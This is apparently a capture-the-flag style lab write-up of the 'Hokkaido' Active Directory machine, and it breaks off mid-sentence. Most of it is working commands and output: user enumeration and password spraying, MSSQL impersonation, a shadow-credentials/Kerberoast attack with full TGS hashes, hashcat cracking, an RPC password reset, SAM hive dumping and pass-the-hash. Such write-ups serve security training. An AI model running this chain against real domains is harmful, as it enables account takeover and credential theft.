#box #kerbrute #impacket-mssqlclient #GenericWrite #Kerberoasting #pywhisker #rpcclient #rpc-setuserinfo #hashcat #xfreerdp #SAM #impacket-secretsdump 

Hokkaido is an AD machine involving numerous enumeration technique and an initial access to an AD that then grants access to further users in the directory that will permit us to obtain movements until rooting the machine. The machine involves no direct CVE and it consists of full enumeration.
The machine starts simulating a real life pentest with some initial credentials: `info:info`
## Nmap

```bash
# Nmap 7.95 scan initiated Mon Jul  7 12:19:11 2025 as: /usr/lib/nmap/nmap -o nmap_sCV --min-rate=10000 -sCV 192.168.117.40
Nmap scan report for 192.168.117.40
Host is up (0.032s latency).
Not shown: 985 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-07 16:19:17Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.hokkaido-aerospace.com
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.hokkaido-aerospace.com
| Not valid before: 2023-12-07T13:54:18
|_Not valid after:  2024-12-06T13:54:18
|_ssl-date: 2025-07-07T16:20:05+00:00; 0s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.hokkaido-aerospace.com
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.hokkaido-aerospace.com
| Not valid before: 2023-12-07T13:54:18
|_Not valid after:  2024-12-06T13:54:18
|_ssl-date: 2025-07-07T16:20:05+00:00; 0s from scanner time.
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-08-02T02:28:44
|_Not valid after:  2054-08-02T02:28:44
| ms-sql-info: 
|   192.168.117.40:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   192.168.117.40:1433: 
|     Target_Name: HAERO
|     NetBIOS_Domain_Name: HAERO
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: hokkaido-aerospace.com
|     DNS_Computer_Name: dc.hokkaido-aerospace.com
|     DNS_Tree_Name: hokkaido-aerospace.com
|_    Product_Version: 10.0.20348
|_ssl-date: 2025-07-07T16:20:05+00:00; 0s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.hokkaido-aerospace.com
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.hokkaido-aerospace.com
| Not valid before: 2023-12-07T13:54:18
|_Not valid after:  2024-12-06T13:54:18
|_ssl-date: 2025-07-07T16:20:05+00:00; 0s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-07T16:20:05+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=dc.hokkaido-aerospace.com
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.hokkaido-aerospace.com
| Not valid before: 2023-12-07T13:54:18
|_Not valid after:  2024-12-06T13:54:18
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: HAERO
|   NetBIOS_Domain_Name: HAERO
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: hokkaido-aerospace.com
|   DNS_Computer_Name: dc.hokkaido-aerospace.com
|   DNS_Tree_Name: hokkaido-aerospace.com
|   Product_Version: 10.0.20348
|_  System_Time: 2025-07-07T16:19:56+00:00
|_ssl-date: 2025-07-07T16:20:05+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=dc.hokkaido-aerospace.com
| Not valid before: 2025-07-06T16:18:48
|_Not valid after:  2026-01-05T16:18:48
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-07-07T16:19:58
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jul  7 12:20:06 2025 -- 1 IP address (1 host up) scanned in 55.09 seconds
```

Interesting findings:
* 80, but seems a normal IIS installation
* 88, Kerberos, `Kerbrute` could be useful
* 135, RPC, thus `rpcclient` might be worth to try
* 389, LDAP, looking for interesting info through `ldapsearch`
* 445, SMB, worth to enumerate shares with `smbclient`
* 1433, MSSQL, worth to try with `impacket-mssqlclient`
* 3268, LDAP, might be a good try in case of 389 failover
* 3389, RDP, `rdesktop` or `xfreerdp`
* 5985, WINRM, `evil-winrm` connection

Domain Name: `hokkaido-aerospace.com`
DC Name: `dc.hokkaido-aerospace.com`

After different checks, we found the first lead to be inside SMB.
## 445 - SMB

```bash
smbclient -U hokkaido-aerospace.com/info -L //$ip
Password for [HOKKAIDO-AEROSPACE.COM\info]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        homes           Disk      user homes
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        UpdateServicesPackages Disk      A network share to be used by client systems for collecting all software packages (usually applications) published on this WSUS system.
        WsusContent     Disk      A network share to be used by Local Publishing to place published content on this WSUS system.
        WSUSTemp        Disk      A network share used by Local Publishing from a Remote WSUS Console Instance.
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.169.40 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

SMB returns us a list of interesting shares, most important ones will be:
* NETLOGON, a file called password_reset.txt contains a password that could be the lead for an authentication
* homes, a list of possible domain users is named as folder names. It seems that this share is equivalent to the shares available on the various domain's pcs of the users.

We get the password_reset.txt file and discover a password inside of it `Start123!`

## 88 - Kerberos

Through Kerberos, we try to enumerate available users with the use of `kerbrute` an user enumerator for kerberos. With the following command we'll enumerate a list of available users that we can combine with our found credentials to try authenticate in the domain.

```bash
./kerbrute userenum -d hokkaido-aerospace.com --dc $ip /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 100

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 07/10/25 - Ronnie Flathers @ropnop

2025/07/10 15:13:18 >  Using KDC(s):
2025/07/10 15:13:18 >   192.168.169.40:88

2025/07/10 15:13:18 >  [+] VALID USERNAME:       info@hokkaido-aerospace.com
2025/07/10 15:13:18 >  [+] VALID USERNAME:       administrator@hokkaido-aerospace.com
2025/07/10 15:13:19 >  [+] VALID USERNAME:       INFO@hokkaido-aerospace.com
2025/07/10 15:13:20 >  [+] VALID USERNAME:       Info@hokkaido-aerospace.com
2025/07/10 15:13:22 >  [+] VALID USERNAME:       discovery@hokkaido-aerospace.com
2025/07/10 15:13:22 >  [+] VALID USERNAME:       Administrator@hokkaido-aerospace.com
2025/07/10 15:14:03 >  [+] VALID USERNAME:       maintenance@hokkaido-aerospace.com
```

We then try to crack an access with netexec permutating the list of user with our credential (precisely we'll first remove `info` since we already own that account)

```bash
nxc smb $ip -u kerbruted_users.txt -p Start123! 
SMB         192.168.169.40  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:hokkaido-aerospace.com) (signing:True) (SMBv1:False)
SMB         192.168.169.40  445    DC               [-] hokkaido-aerospace.com\administrator:Start123! STATUS_LOGON_FAILURE 
SMB         192.168.169.40  445    DC               [+] hokkaido-aerospace.com\discovery:Start123!

## Potentially we could also use --continue-on-success flag to check whether more users share the same credentials
```

We now own another account in the system that could grant us potentially other attack vectors. The enumeration rewinds.

## Bloodhound

We decide to make the king step in, and try to obtain an AD snapshot with bloodhound-python.
We successfully obtain the zip file, we then upload it to bloodhound and start our investigation through the graph.
We realize that discovery itself doesn't have anything crucial as an outbound object control, however it belongs to the same group, `services@hokkaido-aerospace.com` as the user `maintenance` which is tracked as a High Value object by bloodhound. However, by following the trail it doesnt seem to lead us anywhere since the Backup Operators group does lead us to a dead end.
Way more interesting is, in reality, the `hrapp-service` user.
It's interesting since it has a `GenericWrite` permission over `Hazel.Green`
That belongs to the groups of `Tier2-Admins` and, most importantly `IT`. This last one might identify some special permissions granted to him that will permit us to gain root privileges.
To wrap it up, we now have to enumerate again our permissions to the various open ports with our `discovery` user to find how we can proceed in our escalation.

## 1433 - MSSQL

Within `impacket-mssqlserver` we opt to jump in the SQL instance as discovery, finding out that we can apparently access the instance.

```bash
impacket-mssqlclient  'hokkaido-aerospace.com/discovery':'Start123!'@$ip -dc-ip $ip -windows-auth
```

Once in, we first type `help` to discover available commands for the mssqlclient of impacket and we find out an interesting command: `enum_impersonate`. This command tells us which user we're able to impersonate with our current user and thus which users we're able to act on behalf of.
Before checking who we're able to impersonate, let's check the available databases with:

```sql
select name from sys.databases

name
-------   
master    
tempdb    
model     
msdb      
hrappdb 
```

An interesting database comes up, `hrappdb` recalling the `hrapp-services` user cited above.
We try to use that databases, unsuccessfully, since we have no read right over it.

```sql
SQL (HAERO\discovery  guest@master)> use hrappdb
ERROR(DC\SQLEXPRESS): Line 1: The server principal "HAERO\discovery" is not able to access the database "hrappdb" under the current security context.
```

We then use `enum_impersonate`, obtaining the missing piece of the puzzle, an user having the right to read on the `hrappdb` database with the right `hrappdb-reader`

```sql
SQL (HAERO\discovery  guest@master)> enum_impersonate
execute as   database   permission_name   state_desc   grantee          grantor          
----------   --------   ---------------   ----------   --------------   --------------   
b'LOGIN'     b''        IMPERSONATE       GRANT        HAERO\services   hrappdb-reader   
```

We impersonate the user with:

```sql
EXECUTE AS LOGIN = 'hrappdb-reader'
```

And we then hop into the `hrappdb` databases

```sql
SQL (hrappdb-reader  guest@master)> use hrappdb
ENVCHANGE(DATABASE): Old Value: master, New Value: hrappdb
INFO(DC\SQLEXPRESS): Line 1: Changed database context to 'hrappdb'.
```

We then discover the available tables on `hrappdb`, discovering `sysauth`

```sql
SQL (hrappdb-reader  hrappdb-reader@hrappdb)> select name from sys.tables
name      
-------   
sysauth
```

We then check what's inside of it, discovering a cleartext password for the user `hrapp-service`, exactly what we were hoping for.

```sql
SQL (hrappdb-reader  hrappdb-reader@hrappdb)> select * from sysauth
id   name               password           
--   ----------------   ----------------   
 0   b'hrapp-service'   b'Untimed$Runny'
```

## AD
### Conquering `Hazel.Green` over GenericWrite with `hrapp-service`
Once obtained the control of `hrapp-service` we're now able to obtain control of the user `Hazel.Green` over a `GenericWrite` permission.
To abuse the permission we can check the bloodhound suggestion that suggests us to opt for a **Targeted Kerberoast** attack or a **Shadow Credentials** attack
We opt for a **Shadow Credentials** attack that will grant us access to `Hazel.Green`. The attack consists into modifying the attribute `msDS-KeyCredentialLink` by generating a public-private key pair and adding them to the attribute of the target.

```bash
python3 ./pywhisker.py -d "HOKKAIDO-AEROSPACE.COM" -u "hrapp-service" -p 'Untimed$Runny' --target 'Hazel.Green' --action "add" --dc-ip 192.168.169.40
```

alternatively we could use [[Kerberoast#^targetedKerberoast|targetedKerberoast]].

The ShadowCredentials attack will provide us the TGS hash for `Hazel.Green`, `discovery` and `maintenance` users.

```bash
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (Hazel.Green)
$krb5tgs$23$*Hazel.Green$HOKKAIDO-AEROSPACE.COM$hokkaido-aerospace.com/Hazel.Green*$9ac6f9c1eddb0cf04657905fd01d489a$b11bee91bd1f49ce8342ac9b3c361874a55eb52f9a691db341b39a982e5162d627d89b734979c02587904df6018667c8f2730154db4d76cff54f5a0d7638e1e1c0a48fe72a51c0c4251189e7d130a0940f1f6eb2947503aba57c6e2e5e38d49ff44141154d6a258e67f832f4d64142e7e017cdcc61e6e49fc8df07a83a6f49fc00d7b6edc64ac9e65affa5155e89e71d5ba90e75234921fe725727225eabcabfcfd639c83c8f32a9f8f62a9b012a0e47f8e5ec152b81f82e9367216d34ebae1c30ecc97d2d95a85aae9af8d7e5266a70e3d40828f0738ca284df406d6750411fcfa8d222a40832c878a51e01ff74ab2373f3c680ef4ee12dc8817110fc165dd36523fe3b5e9ef2933e55da2fb938b4b3a47aeb49684e443366ea7c4388e05fed82aebb5a8956316f04e080f0039f0d04f0927943b037d416e9541c45ede936c5308fa10586f50abb314d470edc5c205abcaa76bf6139e14c49dee36a3782ff8eb2468f3a1844642ac56570a711b71f8d44af9d7ca0cd70f798759fe4c98f4b4242b1a6c879df552d953ff055068c8d0e882963643ed39a5c295119516e2b85fad30b59c4dc009d106f61799e972c6e8390157cba3b30854a8db94b5d3564d5cf9287beb7214da6123db25f24870a48bcd2552849fb62c0e9836d2edc135b983c122ab177d2f523e1f8491e31106b720edaaa7918ed4c7b683475282c3c76ab2a292cfff6198ab14e95d0fe0275c0d92234a7f093f78c37d6e629e98da8d718d3a117d09f96733e500d6677414c5ff518cb04ae18736b36d0cbe6cda9ac38e1d240250dd84b1009e39c690d41861d503904d4de19841e9f34ebc204bee4887c3e791e70b447554d2e01eeff4bad6d3f3943df704af417706a87623ac39aa200b9ac34949a26c219ea9ef18b34ac57f09abba7bb321e77f4555335e27f089a2322041e71b5d545f0b81a3465a2dbe65ea29f6c39a91e6c6b3f88cc5f77adf30bde2b90c29903a12ca1f630d3e12b7b466776ba63141bf677a10e5569703b4cf6f97365e3457aea8c7478e4f5e2987e7a4101a9464e3f327f8551ccdb008b11550b981a3e27d9aaf1e8f9d2f037937621fef19569e7a7d5ecdbb8a169af54da171b875802e904ccd59acb3ac8a3e473dd0d6881c40605f78bee22c1656e0c73e290d778ff14b8ae4ad16e13bcf1e00282a980935a8038ea97ae18fc324fd80fbc642cf848ab9652386107274c6d022af67f294ca23cb74c21e7a027f8a5898d2325b14fb7c0d6b96a894c0cda91f5d99ff87e19f32e5b3a0ca55b587d135a8d504e56cb30a022d3829303c829666606cbdcc0893ad99236586c0b158019f1bdebff79e5e2482b466c125b1381c1cd8e1a646b4b55c2e9e3c5bcd99508a3e0990b3f4bf8818ebb95500a2b68242a1511441e14a5ab659cc8325a5c3e8db2c9016a751877808951ef82d546c2e4dffd86709027e990192f2bdd92ef2a1d8111e0ad492f3c74c81076bffc286284d9ad24420d15ce7f780970995af0b904bc7eba070cb01b26b4882e52ca9ced548bc87bd4534b0e969389c18661368082e13914f275102728291afc42dd80398ea5b23d36d1451a84b3746f0336bfdfd363a78759024c5d5bd5fcaa33ba03245797
[+] Printing hash for (discovery)
$krb5tgs$23$*discovery$HOKKAIDO-AEROSPACE.COM$hokkaido-aerospace.com/discovery*$99eaa6c04fffd254006e1224cec72b6a$7efac269a663746e7f878883720cd78370160b6c50007369253de62414f3da3e18b9a2de70912f7a0d5f210ed817b1b12a2ad99d8fda44564adc8c31f7178279616c58a075e9039cc5fd38060993b7855a2a6c8828e20aad1c782fe389bf2f20391a264114737ce20c70218e0d845e924461032b6ba9ed71c51a2c49ec02f2603e3a89c90632ceeff90489364a4ff82e565827ca5d1b7c3ff6bcae4143ca5d9494c80e52228509f4fbbad9eb1906cfe0cf2bb78532d6486dfce41efd18b1ac97eb81a2c3a563f06b8da674dc1216bdf652e62c3c9a6ecd1a8800f06a5c764023b3bd7a155a0c7b0db0267a0c994df89b5b0667aca3b4d0be8105a650dd7df86a2c7c97fc4c431fa4ca1ccccfd77d1e6bda5e7574c1e8eb991a1838874d1874d87fb52e55df982926e5dbc2074e840ea4ac9cc86e1a6e4fea3ee349f6a496d63fa3653059aa89068ecc01f3c5c24bcf92c4dc1c44afd4ad204d1e1031abadc4a8262c348cb9180c0059331b11be5937f60c71f83c0acc93b8f77295b858b855dd441aedc54721a975a6c66052c240cf930a47eb7227094a19de380c7249e3d828fbdb2f6ade671eecf0b32885121e5b802f45820e494524f7abd8f9050b12afd1f9cc28288bb7ca75a092caf13b0650843a171ccbae9ab3283f8a46d94619e0db0117a86ec228f6f23bb38659b266100a97a389cec95a4f71ac71c6bcabd29db548baab03e87f03987495f36c80ef0c12676d2852ba96912c0dc3c135a831e5d90d885a39f2d67f66eb8e2401f4973f290ec41540a983c83db32f816d182db93d70057dfed5703db6d1a1f652d8ebe724e851aa9296292da2ef30a7a24e93aeea7ab22307bacef63dbcd38447668585e2c86048314b59d835e9dabeec9eee85837d71710e6db11c544787810406c900e3bbab8086d285e58edba702e3f56fef8976f8084c6c1db0434ddd002dcbff37f270f2f4af929b10f1e6fe7c430c9f5d5cc86379b2470f9728dc81e0361e724407405ac60d330e8363c9c331fd14325c5f269e0d09030cdd1484823675f786b70e92e74126ff3df6455597026fac919d80df9b634bbe5642434b0c94d32cd8cd8097648840fd021c055ce605f29686d184f56b2ee55a067897ef6895cf59379de29e4816714ade002062ac99d5467525a0c3c5869d69f24f5f6eb3607a0e59c7836af2b5e28ac97776f155fca6a4d16a8d0f4f60061772bea037333e66a41592553294b0c8aa71f98affb8e57147428bfbc8541e91fd05b5eb68ea58a7f6c5c5909f0c6661bfa4f2c65542b5d23592d3dd4c783f12aaf1749e7e6ef1d995ce086c3bf00e0643025180d595872b19079dd66dbc1f78b42d3889c56ed493cc99bb102d45a0519cc9a6cd531e5d285758767c7870124734e2818a425dd4f5c3a6f8a599c5d930408b15b69ab3116df79e73e4707428786e361d9cc5bea3b5a0777fc8576afe9a64d1777f142d472797a05ea93afe5912e3e7d56caf6132b79248efaffb0e62ce0c1f5884ac51cff03d9ee0304ae2e82e92c0e034465a3f3996fad6c01ce9c88aa7d205c0d95afbcec0fc1f762c7e2e496b34727cda06bb136dbf8d3d3310d26c072dcbc99016632bad02f377cc358534cf0f8901860fdadf
[+] Printing hash for (maintenance)
$krb5tgs$23$*maintenance$HOKKAIDO-AEROSPACE.COM$hokkaido-aerospace.com/maintenance*$dfa13f6e0dc973bfdc5ae6bc3f44fd96$cb214c9fa390652d1291477e96acc9b2b30eb9d1b81a16813916759c46f8ca88785943eb196eea3526f77c357c7fca2a180114a9538be042341f283d75b9bc0e70ef1e0241333eb8104d6cb7252a334f61e70ecddf7572d30b51e0667d9b34a08e2746fc77576ac2c60c812f24bc1b80c73e2323aa131748970af36f9070d6626a9744d72c03e74e64ecfecbeb708f50bf83defa925797d158be4bbddc7cea6a1863c02925d85c6cd60b2366ff4914b4f9990bcb827d3c6e2fce74fc099b358cdafbfa7035f7303a87f553d3a0b08604f0a1c3cc3923fdd67c764ccdd06d695d047776d55b0a98b49a41df0a03b5f1a1ca0dd86516784f9d89f7df2e472f0ebddb65e5415ac2ecdaf4bf82522875232eeb02959b6e27265d7af73bf754e18185ace25928bc2cbb9636dddcefdf4593650ae976850fa31bb6fa244fee076bccb8fe0d6de9b7d48f42bd99732304d5db17f636b7d20fbe5991d0dbbfd9448e5778a2e5fbe427237c44dc39cf2931c039429615cc0c1c4cb6e39c27cc904e2fa26842405e5ddec531143cd3ae62ed67bb033003c120d1f383fe07185ddbff1c36fa8477a328b76b9c8c78d42d22e98814337fc2be763a899635e54fdc2bddad30fc242ea959c9ed613c6cd591dfbcd892425cb98105353cce34c0f4b2087ff2009a62ba78c63138880d1ba77d25d53c75427534f8de6d01a5ddb98f36baeb197796849baeae62b530fe4bd26daf543c48490db4b0f280d3dee4124ac6e9547d232d9f7a4e1d031b135e99b0d095196e56043053ff94dff3a8dd8eced7d4f62ff7ae88fe9ca603574ac0179e903989b096c5f8809ea60473fa7d24eadaab4c28b5d41dada8fa05817a629cdc48347372aaf217c99966a70d7fec488714001739e90d684fe4142ba0cea9d05ead5a08ecebc23f8da0d01ae2585d6f91e94218d5686413aacb84f07e279974912300a298f22b8e1175b5a427960ba491bc3bb7d53aa2d19e20f1067dcc9137bb58666f06f8444da5d920c849cc41bea5e3997c2e5799c57f77870900e1f56ee86e382194686155ee377efd8e779910aab46cd1c6363cbf2e6ab697e5546c18f8d58c9f3ef7b7ddf9801680d5a48070c533c55335a763413fb446ae570c90d75f5abd7482721f55fa1b1647e7d9b59f84e7b4ec3778c6d1607b0f227a2bd53ca34f3a7df821d2e77eaccd45c2951da5c1200a4c954a8b1b9691b26de63528a27670eb781a8a876b9de2147165fc438e8eec500e47bf0798f0a4ed4ef51c3e3206de5b1ad9ecd42f6ba9c91242daa0f401d18cd0cda3471d29827e6d811cac5831086a5c8ee17db9c015faa9dc4694f5ffa1745a5e54a19fdc2a5f7f7e1e843324dee7fc89c88e96414850325a6cca965aecb81ee8b69cb2a9b8ac65f98bc9e71534e86c42129e1f3d3dbf0e2cbbd783118878cad11417aa3958e67c8dbf75515725fecb573c0eb599b85794a029151a4cb08b3d555cfab3b377ec81349c344be578e0aa2b8f86e3021b211c309d6aeade3217371893ed4a0cc20f4cd0646b5b28fa441eb93d0e18a2b24ddbfe11ab49431c161ef4d67f1d3e16b757a8892ecd0506e87eddb45d124881b81a22bb2c7dc6046ff7699cd9fe31a0d3189ab179f2f15ceb
```

It'll now be possible to crack those tgs by adding them to a file and using hashcat to crack them

```bash
hashcat -m 13100 hazel_green_tgs.txt /usr/share/wordlists/rockyou.txt
```

This will return us a new pair of credentials: `Hazel.Green:haze1988`

## 135 - RPC

Once authenticated as Hazel.Green we've now collected a piece of the puzzle that belongs to the IT group.
This will grant us to, theoretically, be able to change the password of the users through RPC, and by looking at Bloodhound, an interesting objective could be `Molly.Smith` 
Since she belongs to the `Tier1-Admins` and the `Remote Desktop Users`
To do so, we can leverage the fact that Hazel.Green belongs to the IT group, so it should have rights to reset the password of domain users at will. We can use `rpcclient` for that.

```bash
rpcclient -N -U 'hazel.green%haze1988' 192.168.169.40
```

Once logged in, we can use the following command to reset the password of `Molly.Smith` to a password of our choice:

```bash
setuserinfo2 MOLLY.SMITH 23 'Password123!'
```

We now have a new pair of credentials: `Molly.Smith:Password123!`

## 3389 - RDP

After further enumeration, we find out that Molly.Smith is able to authenticated to the target machine through RDP, and we use `xfreerdp3` for this:

```bash
xfreerdp3 /v:192.168.169.40 /u:molly.smith /p:Password123! /bpp:8 /network:modem /compression -themes -wallpaper /size:1920x1000 /drive:./test +clipboard
```

Once inside, after performing some enumeration, we find out that we're able to extrapolate the `sam.save` and the `system.save`. Those are enough to return us the NTLM hash of the users of the machine, thus we extrapolate them and move them to our machine for either cracking or to perform a PtH attack:

```shell
reg.exe save hklm\system C:\Temp\system.save
reg.exe save hklm\sam C:\Temp\sam.save
```

Once done, we move them to our machine and proceed to retrieve the hashes with `impacket-secretsdump` obtaining the following hashes:

```bash
┌──(myenv)─(root㉿kali)-[~/Desktop/OSCP/Hokkaido]
└─# impacket-secretsdump -sam sam -system system LOCAL     
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x2fcb0ca02fb5133abd227a05724cd961
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d752482897d54e239376fddb2a2109e4:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up... 
```

## 5985 - WinRM

We realize how we can actually authenticate through a PtH as Administrator to the target machine and obtain root:

```bash
evil-winrm -u Administrator -i 192.168.169.40 -H d752482897d54e239376fddb2a2109e4
```

Once inside the machine, by looking at the hints we discovered that we require to forge a Silver Ticket to escalate. By lookin